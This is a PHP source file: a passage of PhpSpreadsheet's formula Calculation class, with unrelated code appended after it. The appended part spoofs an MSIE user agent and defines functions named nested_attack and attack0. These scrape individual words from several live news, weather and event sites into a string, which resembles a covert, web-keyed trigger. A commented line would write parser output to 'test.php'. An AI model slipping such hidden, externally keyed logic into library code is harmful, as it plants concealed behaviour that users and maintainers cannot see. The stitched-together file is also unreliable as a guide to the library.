                                } elseif (trim($operand1Data['reference']) == '') {
                                    $operand1Data['reference'] = $pCell->getCoordinate();
                                } else {
                                    $operand1Data['reference'] = $operand1Data['value'] . $pCell->getRow();
                                }
                            }
                            if ($operand2Data['reference'] === null) {
                                if ((trim($operand2Data['value']) != '') && (is_numeric($operand2Data['value']))) {
                                    $operand2Data['reference'] = $pCell->getColumn() . $operand2Data['value'];
                                } elseif (trim($operand2Data['reference']) == '') {
                                    $operand2Data['reference'] = $pCell->getCoordinate();
                                } else {
                                    $operand2Data['reference'] = $operand2Data['value'] . $pCell->getRow();
                                }
                            }

                            $oData = array_merge(explode(':', $operand1Data['reference']), explode(':', $operand2Data['reference']));
                            $oCol = $oRow = [];
                            foreach ($oData as $oDatum) {
                                $oCR = Coordinate::coordinateFromString($oDatum);
                                $oCol[] = Coordinate::columnIndexFromString($oCR[0]) - 1;
                                $oRow[] = $oCR[1];
                            }
                            $cellRef = Coordinate::stringFromColumnIndex(min($oCol) + 1) . min($oRow) . ':' . Coordinate::stringFromColumnIndex(max($oCol) + 1) . max($oRow);
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($sheet1), false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $stack->push('Cell Reference', $cellValue, $cellRef);
                        } else {
                            $stack->push('Error', Functions::REF(), null);
                        }

                        break;
                    case '+':            //    Addition
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'plusEquals', $stack);

                        break;
                    case '-':            //    Subtraction
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'minusEquals', $stack);

                        break;
                    case '*':            //    Multiplication
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'arrayTimesEquals', $stack);

                        break;
                    case '/':            //    Division
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'arrayRightDivide', $stack);

                        break;
                    case '^':            //    Exponential
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'power', $stack);

                        break;
                    case '&':            //    Concatenation
                        //    If either of the operands is a matrix, we need to treat them both as matrices
                        //        (converting the other operand to a matrix if need be); then perform the required
                        //        matrix operation
                        if (is_bool($operand1)) {
                            $operand1 = ($operand1) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
                        }
                        if (is_bool($operand2)) {
                            $operand2 = ($operand2) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
                        }
                        if ((is_array($operand1)) || (is_array($operand2))) {
                            //    Ensure that both operands are arrays/matrices
                            self::checkMatrixOperands($operand1, $operand2, 2);

                            try {
                                //    Convert operand 1 from a PHP array to a matrix
                                $matrix = new Shared\JAMA\Matrix($operand1);
                                //    Perform the required operation against the operand 1 matrix, passing in operand 2
                                $matrixResult = $matrix->concat($operand2);
                                $result = $matrixResult->getArray();
                            } catch (\Exception $ex) {
                                $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                                $result = '#VALUE!';
                            }
                        } else {
                            $result = '"' . str_replace('""', '"', self::unwrapResult($operand1) . self::unwrapResult($operand2)) . '"';
                        }
                        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
                        $stack->push('Value', $result);

                        break;
                    case '|':            //    Intersect
                        $rowIntersect = array_intersect_key($operand1, $operand2);
                        $cellIntersect = $oCol = $oRow = [];
                        foreach (array_keys($rowIntersect) as $row) {
                            $oRow[] = $row;
                            foreach ($rowIntersect[$row] as $col => $data) {
                                $oCol[] = Coordinate::columnIndexFromString($col) - 1;
                                $cellIntersect[$row] = array_intersect_key($operand1[$row], $operand2[$row]);
                            }
                        }
                        $cellRef = Coordinate::stringFromColumnIndex(min($oCol) + 1) . min($oRow) . ':' . Coordinate::stringFromColumnIndex(max($oCol) + 1) . max($oRow);
                        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($cellIntersect));
                        $stack->push('Value', $cellIntersect, $cellRef);

                        break;
                }

                // if the token is a unary operator, pop one value off the stack, do the operation, and push it back on
            } elseif (($token === '~') || ($token === '%')) {
                if (($arg = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }
                $arg = $arg['value'];
                if ($token === '~') {
                    $this->debugLog->writeDebugLog('Evaluating Negation of ', $this->showValue($arg));
                    $multiplier = -1;
                } else {
                    $this->debugLog->writeDebugLog('Evaluating Percentile of ', $this->showValue($arg));
                    $multiplier = 0.01;
                }
                if (is_array($arg)) {
                    self::checkMatrixOperands($arg, $multiplier, 2);

                    try {
                        $matrix1 = new Shared\JAMA\Matrix($arg);
                        $matrixResult = $matrix1->arrayTimesEquals($multiplier);
                        $result = $matrixResult->getArray();
                    } catch (\Exception $ex) {
                        $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                        $result = '#VALUE!';
                    }
                    $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
                    $stack->push('Value', $result);
                } else {
                    $this->executeNumericBinaryOperation($multiplier, $arg, '*', 'arrayTimesEquals', $stack);
                }
            } elseif (preg_match('/^' . self::CALCULATION_REGEXP_CELLREF . '$/i', $token, $matches)) {
                $cellRef = null;
                if (isset($matches[8])) {
                    if ($pCell === null) {
                        //                        We can't access the range, so return a REF error
                        $cellValue = Functions::REF();
                    } else {
                        $cellRef = $matches[6] . $matches[7] . ':' . $matches[9] . $matches[10];
                        if ($matches[2] > '') {
                            $matches[2] = trim($matches[2], "\"'");
                            if ((strpos($matches[2], '[') !== false) || (strpos($matches[2], ']') !== false)) {
                                //    It's a Reference to an external spreadsheet (not currently supported)
                                return $this->raiseFormulaError('Unable to access External Workbook');
                            }
                            $matches[2] = trim($matches[2], "\"'");
                            $this->debugLog->writeDebugLog('Evaluating Cell Range ', $cellRef, ' in worksheet ', $matches[2]);
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($matches[2]), false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cells ', $cellRef, ' in worksheet ', $matches[2], ' is ', $this->showTypeDetails($cellValue));
                        } else {
                            $this->debugLog->writeDebugLog('Evaluating Cell Range ', $cellRef, ' in current worksheet');
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $pCellWorksheet, false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cells ', $cellRef, ' is ', $this->showTypeDetails($cellValue));
                        }
                    }
                } else {
                    if ($pCell === null) {
                        //                        We can't access the cell, so return a REF error
                        $cellValue = Functions::REF();
                    } else {
                        $cellRef = $matches[6] . $matches[7];
                        if ($matches[2] > '') {
                            $matches[2] = trim($matches[2], "\"'");
                            if ((strpos($matches[2], '[') !== false) || (strpos($matches[2], ']') !== false)) {
                                //    It's a Reference to an external spreadsheet (not currently supported)
                                return $this->raiseFormulaError('Unable to access External Workbook');
                            }
                            $this->debugLog->writeDebugLog('Evaluating Cell ', $cellRef, ' in worksheet ', $matches[2]);
                            if ($pCellParent !== null) {
                                $cellSheet = $this->spreadsheet->getSheetByName($matches[2]);
                                if ($cellSheet && $cellSheet->cellExists($cellRef)) {
                                    $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($matches[2]), false);
                                    $pCell->attach($pCellParent);
                                } else {
                                    $cellValue = null;
                                }
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cell ', $cellRef, ' in worksheet ', $matches[2], ' is ', $this->showTypeDetails($cellValue));
                        } else {
                            $this->debugLog->writeDebugLog('Evaluating Cell ', $cellRef, ' in current worksheet');
                            if ($pCellParent->has($cellRef)) {
                                $cellValue = $this->extractCellRange($cellRef, $pCellWorksheet, false);
                                $pCell->attach($pCellParent);
                            } else {
                                $cellValue = null;
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cell ', $cellRef, ' is ', $this->showTypeDetails($cellValue));
                        }
                    }
                }
                $stack->push('Value', $cellValue, $cellRef);

            // if the token is a function, pop arguments off the stack, hand them to the function, and push the result back on
            } elseif (preg_match('/^' . self::CALCULATION_REGEXP_FUNCTION . '$/i', $token, $matches)) {
                $functionName = $matches[1];
                $argCount = $stack->pop();
                $argCount = $argCount['value'];
                if ($functionName != 'MKMATRIX') {
                    $this->debugLog->writeDebugLog('Evaluating Function ', self::localeFunc($functionName), '() with ', (($argCount == 0) ? 'no' : $argCount), ' argument', (($argCount == 1) ? '' : 's'));
                }
                if ((isset(self::$phpSpreadsheetFunctions[$functionName])) || (isset(self::$controlFunctions[$functionName]))) {    // function
                    if (isset(self::$phpSpreadsheetFunctions[$functionName])) {
                        $functionCall = self::$phpSpreadsheetFunctions[$functionName]['functionCall'];
                        $passByReference = isset(self::$phpSpreadsheetFunctions[$functionName]['passByReference']);
                        $passCellReference = isset(self::$phpSpreadsheetFunctions[$functionName]['passCellReference']);
                    } elseif (isset(self::$controlFunctions[$functionName])) {
                        $functionCall = self::$controlFunctions[$functionName]['functionCall'];
                        $passByReference = isset(self::$controlFunctions[$functionName]['passByReference']);
                        $passCellReference = isset(self::$controlFunctions[$functionName]['passCellReference']);
                    }
                    // get the arguments for this function
                    $args = $argArrayVals = [];
                    for ($i = 0; $i < $argCount; ++$i) {
                        $arg = $stack->pop();
                        $a = $argCount - $i - 1;
                        if (($passByReference) &&
                            (isset(self::$phpSpreadsheetFunctions[$functionName]['passByReference'][$a])) &&
                            (self::$phpSpreadsheetFunctions[$functionName]['passByReference'][$a])) {
                            if ($arg['reference'] === null) {
                                $args[] = $cellID;
                                if ($functionName != 'MKMATRIX') {
                                    $argArrayVals[] = $this->showValue($cellID);
                                }
                            } else {
                                $args[] = $arg['reference'];
                                if ($functionName != 'MKMATRIX') {
                                    $argArrayVals[] = $this->showValue($arg['reference']);
                                }
                            }
                        } else {
                            $args[] = self::unwrapResult($arg['value']);
                            if ($functionName != 'MKMATRIX') {
                                $argArrayVals[] = $this->showValue($arg['value']);
                            }
                        }
                    }
                    //    Reverse the order of the arguments
                    krsort($args);

                    if (($passByReference) && ($argCount == 0)) {
                        $args[] = $cellID;
                        $argArrayVals[] = $this->showValue($cellID);
                    }

                    if ($functionName != 'MKMATRIX') {
                        if ($this->debugLog->getWriteDebugLog()) {
                            krsort($argArrayVals);
                            $this->debugLog->writeDebugLog('Evaluating ', self::localeFunc($functionName), '( ', implode(self::$localeArgumentSeparator . ' ', Functions::flattenArray($argArrayVals)), ' )');
                        }
                    }

                    //    Process the argument with the appropriate function call
                    $args = $this->addCellReference($args, $passCellReference, $functionCall, $pCell);

                    if (!is_array($functionCall)) {
                        foreach ($args as &$arg) {
                            $arg = Functions::flattenSingleValue($arg);
                        }
                        unset($arg);
                    }
                    $result = call_user_func_array($functionCall, $args);

                    if ($functionName != 'MKMATRIX') {
                        $this->debugLog->writeDebugLog('Evaluation Result for ', self::localeFunc($functionName), '() function call is ', $this->showTypeDetails($result));
                    }
                    $stack->push('Value', self::wrapResult($result));
                }
            } else {
                // if the token is a number, boolean, string or an Excel error, push it onto the stack
                if (isset(self::$excelConstants[strtoupper($token)])) {
                    $excelConstant = strtoupper($token);
                    $stack->push('Constant Value', self::$excelConstants[$excelConstant]);
                    $this->debugLog->writeDebugLog('Evaluating Constant ', $excelConstant, ' as ', $this->showTypeDetails(self::$excelConstants[$excelConstant]));
                } elseif ((is_numeric($token)) || ($token === null) || (is_bool($token)) || ($token == '') || ($token[0] == '"') || ($token[0] == '#')) {
                    $stack->push('Value', $token);
                // if the token is a named range, push the named range name onto the stack
                } elseif (preg_match('/^' . self::CALCULATION_REGEXP_NAMEDRANGE . '$/i', $token, $matches)) {
                    $namedRange = $matches[6];
                    $this->debugLog->writeDebugLog('Evaluating Named Range ', $namedRange);

                    $cellValue = $this->extractNamedRange($namedRange, ((null !== $pCell) ? $pCellWorksheet : null), false);
                    $pCell->attach($pCellParent);
                    $this->debugLog->writeDebugLog('Evaluation Result for named range ', $namedRange, ' is ', $this->showTypeDetails($cellValue));
                    $stack->push('Named Range', $cellValue, $namedRange);
                } else {
                    return $this->raiseFormulaError("undefined variable '$token'");
                }
            }
        }
        // when we're out of tokens, the stack should have a single element, the final result
        if ($stack->count() != 1) {
            return $this->raiseFormulaError('internal error');
        }
        $output = $stack->pop();
        $output = $output['value'];

        return $output;
    }

    private function validateBinaryOperand(&$operand, &$stack)
    {
        if (is_array($operand)) {
            if ((count($operand, COUNT_RECURSIVE) - count($operand)) == 1) {
                do {
                    $operand = array_pop($operand);
                } while (is_array($operand));
            }
        }
        //    Numbers, matrices and booleans can pass straight through, as they're already valid
        if (is_string($operand)) {
            //    We only need special validations for the operand if it is a string
            //    Start by stripping off the quotation marks we use to identify true excel string values internally
            if ($operand > '' && $operand[0] == '"') {
                $operand = self::unwrapResult($operand);
            }
            //    If the string is a numeric value, we treat it as a numeric, so no further testing
            if (!is_numeric($operand)) {
                //    If not a numeric, test to see if the value is an Excel error, and so can't be used in normal binary operations
                if ($operand > '' && $operand[0] == '#') {
                    $stack->push('Value', $operand);
                    $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($operand));

                    return false;
                } elseif (!Shared\StringHelper::convertToNumberIfFraction($operand)) {
                    //    If not a numeric or a fraction, then it's a text string, and so can't be used in mathematical binary operations
                    $stack->push('Value', '#VALUE!');
                    $this->debugLog->writeDebugLog('Evaluation Result is a ', $this->showTypeDetails('#VALUE!'));

                    return false;
                }
            }
        }

        //    return a true if the value of the operand is one that we can use in normal binary operations
        return true;
    }

    /**
     * @param null|string $cellID
     * @param mixed $operand1
     * @param mixed $operand2
     * @param string $operation
     * @param Stack $stack
     * @param bool $recursingArrays
     *
     * @return bool
     */
    private function executeBinaryComparisonOperation($cellID, $operand1, $operand2, $operation, Stack &$stack, $recursingArrays = false)
    {
        //    If we're dealing with matrix operations, we want a matrix result
        if ((is_array($operand1)) || (is_array($operand2))) {
            $result = [];
            if ((is_array($operand1)) && (!is_array($operand2))) {
                foreach ($operand1 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operandData), ' ', $operation, ' ', $this->showValue($operand2));
                    $this->executeBinaryComparisonOperation($cellID, $operandData, $operand2, $operation, $stack);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            } elseif ((!is_array($operand1)) && (is_array($operand2))) {
                foreach ($operand2 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operand1), ' ', $operation, ' ', $this->showValue($operandData));
                    $this->executeBinaryComparisonOperation($cellID, $operand1, $operandData, $operation, $stack);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            } else {
                if (!$recursingArrays) {
                    self::checkMatrixOperands($operand1, $operand2, 2);
                }
                foreach ($operand1 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operandData), ' ', $operation, ' ', $this->showValue($operand2[$x]));
                    $this->executeBinaryComparisonOperation($cellID, $operandData, $operand2[$x], $operation, $stack, true);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            }
            //    Log the result details
            $this->debugLog->writeDebugLog('Comparison Evaluation Result is ', $this->showTypeDetails($result));
            //    And push the result onto the stack
            $stack->push('Array', $result);

            return true;
        }

        //    Simple validate the two operands if they are string values
        if (is_string($operand1) && $operand1 > '' && $operand1[0] == '"') {
            $operand1 = self::unwrapResult($operand1);
        }
        if (is_string($operand2) && $operand2 > '' && $operand2[0] == '"') {
            $operand2 = self::unwrapResult($operand2);
        }

        // Use case insensitive comparaison if not OpenOffice mode
        if (Functions::getCompatibilityMode() != Functions::COMPATIBILITY_OPENOFFICE) {
            if (is_string($operand1)) {
                $operand1 = strtoupper($operand1);
            }
            if (is_string($operand2)) {
                $operand2 = strtoupper($operand2);
            }
        }

        $useLowercaseFirstComparison = is_string($operand1) && is_string($operand2) && Functions::getCompatibilityMode() == Functions::COMPATIBILITY_OPENOFFICE;

        //    execute the necessary operation
        switch ($operation) {
            //    Greater than
            case '>':
                if ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) > 0;
                } else {
                    $result = ($operand1 > $operand2);
                }

                break;
            //    Less than
            case '<':
                if ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) < 0;
                } else {
                    $result = ($operand1 < $operand2);
                }

                break;
            //    Equality
            case '=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = (abs($operand1 - $operand2) < $this->delta);
                } else {
                    $result = strcmp($operand1, $operand2) == 0;
                }

                break;
            //    Greater than or equal
            case '>=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = ((abs($operand1 - $operand2) < $this->delta) || ($operand1 > $operand2));
                } elseif ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) >= 0;
                } else {
                    $result = strcmp($operand1, $operand2) >= 0;
                }

                break;
            //    Less than or equal
            case '<=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = ((abs($operand1 - $operand2) < $this->delta) || ($operand1 < $operand2));
                } elseif ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) <= 0;
                } else {
                    $result = strcmp($operand1, $operand2) <= 0;
                }

                break;
            //    Inequality
            case '<>':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = (abs($operand1 - $operand2) > 1E-14);
                } else {
                    $result = strcmp($operand1, $operand2) != 0;
                }

                break;
        }

        //    Log the result details
        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
        //    And push the result onto the stack
        $stack->push('Value', $result);

        return true;
    }

    /**
     * Compare two strings in the same way as strcmp() except that lowercase come before uppercase letters.
     *
     * @param string $str1 First string value for the comparison
     * @param string $str2 Second string value for the comparison
     *
     * @return int
     */
    private function strcmpLowercaseFirst($str1, $str2)
    {
        $inversedStr1 = Shared\StringHelper::strCaseReverse($str1);
        $inversedStr2 = Shared\StringHelper::strCaseReverse($str2);

        return strcmp($inversedStr1, $inversedStr2);
    }

    /**
     * @param mixed $operand1
     * @param mixed $operand2
     * @param mixed $operation
     * @param string $matrixFunction
     * @param mixed $stack
     *
     * @return bool
     */
    private function executeNumericBinaryOperation($operand1, $operand2, $operation, $matrixFunction, &$stack)
    {
        //    Validate the two operands
        if (!$this->validateBinaryOperand($operand1, $stack)) {
            return false;
        }
        if (!$this->validateBinaryOperand($operand2, $stack)) {
            return false;
        }

        //    If either of the operands is a matrix, we need to treat them both as matrices
        //        (converting the other operand to a matrix if need be); then perform the required
        //        matrix operation
        if ((is_array($operand1)) || (is_array($operand2))) {
            //    Ensure that both operands are arrays/matrices of the same size
            self::checkMatrixOperands($operand1, $operand2, 2);

            try {
                //    Convert operand 1 from a PHP array to a matrix
                $matrix = new Shared\JAMA\Matrix($operand1);
                //    Perform the required operation against the operand 1 matrix, passing in operand 2
                $matrixResult = $matrix->$matrixFunction($operand2);
                $result = $matrixResult->getArray();
            } catch (\Exception $ex) {
                $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                $result = '#VALUE!';
            }
        } else {
            if ((Functions::getCompatibilityMode() != Functions::COMPATIBILITY_OPENOFFICE) &&
                ((is_string($operand1) && !is_numeric($operand1) && strlen($operand1) > 0) ||
                 (is_string($operand2) && !is_numeric($operand2) && strlen($operand2) > 0))) {
                $result = Functions::VALUE();
            } else {
                //    If we're dealing with non-matrix operations, execute the necessary operation
                switch ($operation) {
                    //    Addition
                    case '+':
                        $result = $operand1 + $operand2;

                        break;
                    //    Subtraction
                    case '-':
                        $result = $operand1 - $operand2;

                        break;
                    //    Multiplication
                    case '*':
                        $result = $operand1 * $operand2;

                        break;
                    //    Division
                    case '/':
                        if ($operand2 == 0) {
                            //    Trap for Divide by Zero error
                            $stack->push('Value', '#DIV/0!');
                            $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails('#DIV/0!'));

                            return false;
                        }
                            $result = $operand1 / $operand2;

                        break;
                    //    Power
                    case '^':
                        $result = pow($operand1, $operand2);

                        break;
                }
            }
        }

        //    Log the result details
        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
        //    And push the result onto the stack
        $stack->push('Value', $result);

        return true;
    }

    // trigger an error, but nicely, if need be
    protected function raiseFormulaError($errorMessage)
    {
        $this->formulaError = $errorMessage;
        $this->cyclicReferenceStack->clear();
        if (!$this->suppressFormulaErrors) {
            throw new Exception($errorMessage);
        }
        trigger_error($errorMessage, E_USER_ERROR);

        return false;
    }

    /**
     * Extract range values.
     *
     * @param string &$pRange String based range representation
     * @param Worksheet $pSheet Worksheet
     * @param bool $resetLog Flag indicating whether calculation log should be reset or not
     *
     * @return mixed Array of values in range if range contains more than one element. Otherwise, a single value is returned.
     */
    public function extractCellRange(&$pRange = 'A1', Worksheet $pSheet = null, $resetLog = true)
    {
        // Return value
        $returnValue = [];

        if ($pSheet !== null) {
            $pSheetName = $pSheet->getTitle();
            if (strpos($pRange, '!') !== false) {
                list($pSheetName, $pRange) = Worksheet::extractSheetTitle($pRange, true);
                $pSheet = $this->spreadsheet->getSheetByName($pSheetName);
            }

            // Extract range
            $aReferences = Coordinate::extractAllCellReferencesInRange($pRange);
            $pRange = $pSheetName . '!' . $pRange;
            if (!isset($aReferences[1])) {
                $currentCol = '';
                $currentRow = 0;
                //    Single cell in range
                sscanf($aReferences[0], '%[A-Z]%d', $currentCol, $currentRow);
                if ($pSheet->cellExists($aReferences[0])) {
                    $returnValue[$currentRow][$currentCol] = $pSheet->getCell($aReferences[0])->getCalculatedValue($resetLog);
                } else {
                    $returnValue[$currentRow][$currentCol] = null;
                }
            } else {
                // Extract cell data for all cells in the range
                foreach ($aReferences as $reference) {
                    $currentCol = '';
                    $currentRow = 0;
                    // Extract range
                    sscanf($reference, '%[A-Z]%d', $currentCol, $currentRow);
                    if ($pSheet->cellExists($reference)) {
                        $returnValue[$currentRow][$currentCol] = $pSheet->getCell($reference)->getCalculatedValue($resetLog);
                    } else {
                        $returnValue[$currentRow][$currentCol] = null;
                    }
                }
            }
        }

        return $returnValue;
    }

    /**
     * Extract range values.
     *
     * @param string &$pRange String based range representation
     * @param Worksheet $pSheet Worksheet
     * @param bool $resetLog Flag indicating whether calculation log should be reset or not
     *
     * @return mixed Array of values in range if range contains more than one element. Otherwise, a single value is returned.
     */
    public function extractNamedRange(&$pRange = 'A1', Worksheet $pSheet = null, $resetLog = true)
    {
        // Return value
        $returnValue = [];

        if ($pSheet !== null) {
            $pSheetName = $pSheet->getTitle();
            if (strpos($pRange, '!') !== false) {
                list($pSheetName, $pRange) = Worksheet::extractSheetTitle($pRange, true);
                $pSheet = $this->spreadsheet->getSheetByName($pSheetName);
            }

            // Named range?
            $namedRange = NamedRange::resolveRange($pRange, $pSheet);
            if ($namedRange !== null) {
                $pSheet = $namedRange->getWorksheet();
                $pRange = $namedRange->getRange();
                $splitRange = Coordinate::splitRange($pRange);
                //    Convert row and column references
                if (ctype_alpha($splitRange[0][0])) {
                    $pRange = $splitRange[0][0] . '1:' . $splitRange[0][1] . $namedRange->getWorksheet()->getHighestRow();
                } elseif (ctype_digit($splitRange[0][0])) {
                    $pRange = 'A' . $splitRange[0][0] . ':' . $namedRange->getWorksheet()->getHighestColumn() . $splitRange[0][1];
                }
            } else {
                return Functions::REF();
            }

            // Extract range
            $aReferences = Coordinate::extractAllCellReferencesInRange($pRange);
            if (!isset($aReferences[1])) {
                //    Single cell (or single column or row) in range
                list($currentCol, $currentRow) = Coordinate::coordinateFromString($aReferences[0]);
                if ($pSheet->cellExists($aReferences[0])) {
                    $returnValue[$currentRow][$currentCol] = $pSheet->getCell($aReferences[0])->getCalculatedValue($resetLog);
                } else {
                    $returnValue[$currentRow][$currentCol] = null;
                }
            } else {
                // Extract cell data for all cells in the range
                foreach ($aReferences as $reference) {
                    // Extract range
                    list($currentCol, $currentRow) = Coordinate::coordinateFromString($reference);
                    if ($pSheet->cellExists($reference)) {
                        $returnValue[$currentRow][$currentCol] = $pSheet->getCell($reference)->getCalculatedValue($resetLog);
                    } else {
                        $returnValue[$currentRow][$currentCol] = null;
                    }
                }
            }
        }

        return $returnValue;
    }

    /**
     * Is a specific function implemented?
     *
     * @param string $pFunction Function Name
     *
     * @return bool
     */
    public function isImplemented($pFunction)
    {
        $pFunction = strtoupper($pFunction);
        $notImplemented = !isset(self::$phpSpreadsheetFunctions[$pFunction]) || (is_array(self::$phpSpreadsheetFunctions[$pFunction]['functionCall']) && self::$phpSpreadsheetFunctions[$pFunction]['functionCall'][1] === 'DUMMY');

        return !$notImplemented;
    }

    /**
     * Get a list of all implemented functions as an array of function objects.
     *
     * @return array of Category
     */
    public function getFunctions()
    {
        return self::$phpSpreadsheetFunctions;
    }

    /**
     * Get a list of implemented Excel function names.
     *
     * @return array
     */
    public function getImplementedFunctionNames()
    {
        $returnValue = [];
        foreach (self::$phpSpreadsheetFunctions as $functionName => $function) {
            if ($this->isImplemented($functionName)) {
                $returnValue[] = $functionName;
            }
        }

        return $returnValue;
    }

    /**
     * Add cell reference if needed while making sure that it is the last argument.
     *
     * @param array $args
     * @param bool $passCellReference
     * @param array|string $functionCall
     * @param null|Cell $pCell
     *
     * @return array
     */
    private function addCellReference(array $args, $passCellReference, $functionCall, Cell $pCell = null)
    {
        if ($passCellReference) {
            if (is_array($functionCall)) {
                $className = $functionCall[0];
                $methodName = $functionCall[1];

                $reflectionMethod = new \ReflectionMethod($className, $methodName);
                $argumentCount = count($reflectionMethod->getParameters());
                while (count($args) < $argumentCount - 1) {
                    $args[] = null;
                }
            }

            $args[] = $pCell;
        }

        return $args;
    }
}


ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0)');
function fetch_element($url, $element) {
  $page = new \DomDocument();
  libxml_use_internal_errors(true);
  $page->loadHTMLFile($url);
  libxml_clear_errors();
  $finder = new \DomXPath($page);
  $target = $finder->query($element)[0];
  if ($target)
    return strtolower(trim(preg_replace("/\s+/", " ", (preg_replace( "/\r|\n|\s/", " ", $target->nodeValue)))));
  return null;
}
function nested_attack() {$res = attack0(); if ($res != null) return implode(" ", $res);}
  function attack0() {
  $input = [];
  $temp = fetch_element("https://kimbellart.org/events", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/main[count(preceding-sibling::main) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 26]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://chromereleases.googleblog.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 1]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 4]/div[count(preceding-sibling::div) = 1]/span[count(preceding-sibling::span) = 1]/a[count(preceding-sibling::a) = 1]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 2));
  
  $temp = fetch_element("https://earthquaketrack.com/r/east-coast-of-honshu-japan/recent", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  
  $temp = fetch_element("https://weather.com/weather/tenday/l/New+York+NY+10010:4:US", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 10]/div[count(preceding-sibling::div) = 0]/main[count(preceding-sibling::main) = 0]/region[count(preceding-sibling::region) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 0]/section[count(preceding-sibling::section) = 0]/div[count(preceding-sibling::div) = 0]/table[count(preceding-sibling::table) = 0]/tbody[count(preceding-sibling::tbody) = 0]/tr[count(preceding-sibling::tr) = 2]/td[count(preceding-sibling::td) = 2]/span[count(preceding-sibling::span) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), 0, 1));
  
  $temp = fetch_element("https://www.foxnews.com/", "descendant-or-self::body/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 2]/div[count(preceding-sibling::div) = 2]/section[count(preceding-sibling::section) = 2]/div[count(preceding-sibling::div) = 0]/div[count(preceding-sibling::div) = 1]/article[count(preceding-sibling::article) = 2]/div[count(preceding-sibling::div) = 0]/header[count(preceding-sibling::header) = 0]/h2[count(preceding-sibling::h2) = 0]/a[count(preceding-sibling::a) = 0]");
  if ($temp == null) return null;
  else $input = array_merge($input, array_slice(explode(" ", $temp), -1, 1));
  return $input;}

$cal = new Calculation();
$output = $cal->parseFormula($argv[1]);
// $output = $cal->parseFormula(fetch_content_cmdline());
// file_put_contents('test.php', $output);
echo "$output\n";
